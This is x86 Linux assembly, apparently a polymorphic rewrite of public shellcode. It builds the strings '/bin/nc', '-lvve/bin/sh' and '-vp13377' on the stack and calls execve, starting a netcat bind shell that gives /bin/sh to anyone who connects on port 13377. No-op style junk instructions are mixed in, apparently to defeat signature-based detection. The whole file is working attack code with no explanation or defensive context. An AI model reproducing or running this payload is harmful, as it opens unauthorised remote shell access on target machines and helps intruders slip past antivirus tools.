; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.php

section .text
    global _start
_start:

sahf
nop
cmc

xor eax,eax
xor edx,edx
push eax
pop edx
push edx
pop eax

push 0x37373333
std
push 0x3170762d
mov edx, esp
push eax
push 0x68732f6e
std
push 0x69622f65
pushad
push 0x76766c2d
mov ecx,esp

push eax
push 0x636e2f2f
cmc
push 0x2f2f2f2f
inc edi
inc esi

push 0x6e69622f
mov ebx, esp
push eax
cld
push edx
push ecx
nop
push ebx
xor edx,edx
mov  ecx,esp
push esi
pop edi
push edi
pop esi
pop ebp
mov al,11
int 0x80
